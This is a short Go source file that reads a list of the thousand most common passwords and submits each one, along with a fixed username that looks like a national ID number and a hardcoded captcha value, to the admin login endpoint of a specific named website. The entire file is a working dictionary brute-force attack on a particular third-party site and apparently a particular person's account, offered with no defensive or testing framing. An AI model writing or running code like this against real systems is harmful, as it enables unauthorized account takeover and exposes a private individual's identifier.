package pass

import (
	"bufio"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"

	"github.com/valyala/fastjson"
)

func ReadLine() []string {

	var pass = make([]string, 0)

	fi, err := os.Open("./top1000.txt")
	if err != nil {
		fmt.Printf("Error: %s\n", err)
		return pass
	}
	defer fi.Close()

	br := bufio.NewReader(fi)
	for {
		a, _, c := br.ReadLine()
		if c == io.EOF {
			break
		}
		// fmt.Println(string(a))
		pass = append(pass, string(a))
	}

	return pass
}

func Login(password string) {
	client := &http.Client{}
	data := "action=login&username=32030519841022041x&password=" + password + "&yzcode=1820"
	req, _ := http.NewRequest(http.MethodPost, "http://plat.xzjxjy.com/admin/server/admin.asp", strings.NewReader(data))
	res, _ := client.Do(req)
	defer res.Body.Close()
	body, _ := ioutil.ReadAll(res.Body)
	jg := fastjson.GetInt(body, "jg")
	msg := fastjson.GetString(body, "msg")
	// if jg == 1 {
	fmt.Println(jg)
	fmt.Println(msg)
	// }

}
